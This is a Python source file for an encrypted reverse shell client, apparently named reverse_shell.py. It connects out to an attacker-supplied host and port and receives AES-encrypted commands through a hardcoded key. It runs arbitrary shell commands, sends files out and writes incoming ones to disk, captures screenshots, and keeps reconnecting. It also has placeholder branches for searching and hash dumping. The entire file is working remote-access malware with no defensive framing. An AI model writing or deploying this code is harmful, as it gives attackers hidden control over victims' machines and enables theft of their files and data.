import socket
import subprocess
import os
import sys
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from time import sleep
from PIL import ImageGrab

# AES encryption/decryption
BLOCK_SIZE = 16
KEY = b'ChdtkSnUtJ3yz8Uq3SJJ6TTZ'  # 24 bytes key (must be 16, 24, or 32 bytes long)

def pad(s):
    return s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def encrypt(message):
    raw = pad(message).encode('utf-8')
    cipher = AES.new(KEY, AES.MODE_ECB)
    return b64encode(cipher.encrypt(raw)).decode('utf-8')

def decrypt(enc):
    enc = b64decode(enc)
    cipher = AES.new(KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(enc)).decode('utf-8')

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return str(e)

def client(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            while True:
                data = s.recv(4096).decode('utf-8')
                if not data:
                    break
                decrypted_data = decrypt(data)
                if decrypted_data.lower() == 'exit':
                    break
                if decrypted_data.startswith('download'):
                    file_path = decrypted_data.split(' ', 1)[1]
                    try:
                        with open(file_path, 'rb') as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk:
                                    break
                                s.send(encrypt(b64encode(chunk).decode('utf-8')).encode('utf-8'))
                        s.send(encrypt('EOF').encode('utf-8'))
                    except Exception as e:
                        s.send(encrypt(f"ERROR: {e}").encode('utf-8'))
                    continue
                if decrypted_data.startswith('upload'):
                    file_path = decrypted_data.split(' ', 1)[1]
                    try:
                        with open(file_path, 'wb') as f:
                            while True:
                                data = s.recv(4096).decode('utf-8')
                                if decrypt(data) == 'EOF':
                                    break
                                f.write(b64decode(decrypt(data)))
                    except Exception as e:
                        s.send(encrypt(f"ERROR: {e}").encode('utf-8'))
                    continue
                if decrypted_data.startswith('ipconfig'):
                    command_result = execute_command("ipconfig" if os.name == 'nt' else "ifconfig")
                elif decrypted_data.startswith('screenshot'):
                    screenshot = ImageGrab.grab()
                    screenshot.save("screenshot.png")
                    with open("screenshot.png", "rb") as f:
                        command_result = b64encode(f.read()).decode('utf-8')
                elif decrypted_data.startswith('search'):
                    # handle search
                    pass
                elif decrypted_data.startswith('hashdump'):
                    # handle hashdump
                    pass
                else:
                    command_result = execute_command(decrypted_data)
                encrypted_result = encrypt(command_result)
                s.send(encrypted_result.encode('utf-8'))
            s.close()
        except Exception as e:
            print(f"Connection error: {e}")
            sleep(10)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python reverse_shell.py <HOST> <PORT>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    client(host, port)
